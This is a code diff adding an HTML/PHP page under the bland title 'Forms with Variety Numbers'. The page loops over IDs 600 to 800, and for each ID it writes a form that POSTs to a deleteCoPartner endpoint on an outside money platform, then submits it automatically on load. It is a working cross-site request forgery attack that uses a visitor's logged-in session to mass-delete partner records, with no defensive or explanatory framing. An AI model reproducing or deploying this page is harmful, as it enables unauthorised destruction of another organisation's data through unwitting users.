@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forms with Variety Numbers</title>
+</head>
+<body>
+
+    <!-- Use a loop to generate forms with variety numbers -->
+    <?php
+    for ($number = 600; $number <= 800; $number++) {
+        echo '<form id="form_' . $number . '" enctype="application/x-www-form-urlencoded" method="POST" action="https://old.moneyplatform.biz/partner/deleteCoPartner/' . $number . '.html?ajax=co-partner-grid">';
+        echo '<table>';
+        echo '<tr>';
+        echo '<td></td>';
+        echo '<td><input type="text" value="undefined" name="input_' . $number . '"></td>';
+        echo '</tr>';
+        echo '</table>';
+        echo '<input type="submit" value="Delete CoPartner ' . $number . '">';
+        echo '</form>';
+        
+        // Add JavaScript to auto-submit the form
+        echo '<script>';
+        echo 'document.getElementById("form_' . $number . '").submit();';
+        echo '</script>';
+    }
+    ?>
+
+</body>
+</html>
